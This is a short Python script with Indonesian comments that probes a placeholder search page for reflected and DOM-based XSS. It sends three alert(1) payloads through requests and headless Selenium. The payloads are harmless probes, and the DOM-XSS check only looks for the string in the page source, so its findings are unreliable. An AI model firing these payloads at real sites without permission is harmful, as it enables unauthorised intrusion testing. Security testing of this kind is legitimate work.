import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time

# URL target dan payload XSS
target_url = "http://example.com/search"
xss_payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)', "' onerror='alert(1)"]

# Fungsi untuk memeriksa reflected XSS
def check_reflected_xss(url, payload):
    params = {'q': payload}
    response = requests.get(url, params=params)
    
    if payload in response.text:
        print(f"Reflected XSS ditemukan dengan payload: {payload}")
    else:
        print(f"Reflected XSS tidak ditemukan dengan payload: {payload}")

# Fungsi untuk memeriksa DOM-based XSS
def check_dom_xss(url, payload):
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Jalankan browser dalam mode headless
    driver = webdriver.Chrome(options=chrome_options)

    try:
        driver.get(url)
        search_box = driver.find_element(By.NAME, 'q')
        search_box.send_keys(payload)
        search_box.send_keys(Keys.RETURN)
        time.sleep(3)  # Tunggu beberapa detik untuk memastikan halaman telah dimuat sepenuhnya
        
        # Periksa apakah payload dieksekusi di DOM
        if payload in driver.page_source:
            print(f"DOM-based XSS ditemukan dengan payload: {payload}")
        else:
            print(f"DOM-based XSS tidak ditemukan dengan payload: {payload}")
    finally:
        driver.quit()

# Memindai XSS dengan payload yang diberikan
for payload in xss_payloads:
    print(f"Memindai dengan payload: {payload}")
    check_reflected_xss(target_url, payload)
    check_dom_xss(target_url, payload)
